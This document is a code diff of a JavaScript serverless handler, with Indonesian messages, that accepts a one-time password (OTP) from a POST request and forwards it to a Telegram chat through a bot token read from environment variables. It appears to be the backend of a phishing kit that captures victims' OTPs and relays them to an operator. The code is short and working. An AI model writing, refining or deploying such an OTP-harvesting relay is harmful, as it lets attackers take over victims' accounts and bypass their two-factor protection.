@@ -1,7 +1,5 @@
-import { token, chat_id } from "./config";
-
 export default async function handler(req, res) {
-  // hanya izinkan POST
+
   if (req.method !== "POST") {
     return res.status(405).json({ message: "Method not allowed" });
   }
@@ -9,7 +7,6 @@ export default async function handler(req, res) {
   try {
     const { otp } = req.body;
 
-    // validasi OTP
     if (!otp) {
       return res.status(400).json({ message: "OTP kosong" });
     }
@@ -20,12 +17,13 @@ export default async function handler(req, res) {
       return res.status(400).json({ message: "OTP tidak valid" });
     }
 
-    // format pesan
+    const token = process.env.TOKEN_BOT;
+    const chat_id = process.env.CHAT_ID;
+
     const text =
       "OTP MASUK\n\n" +
       "Kode OTP: " + kode;
 
-    // kirim ke Telegram
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: {
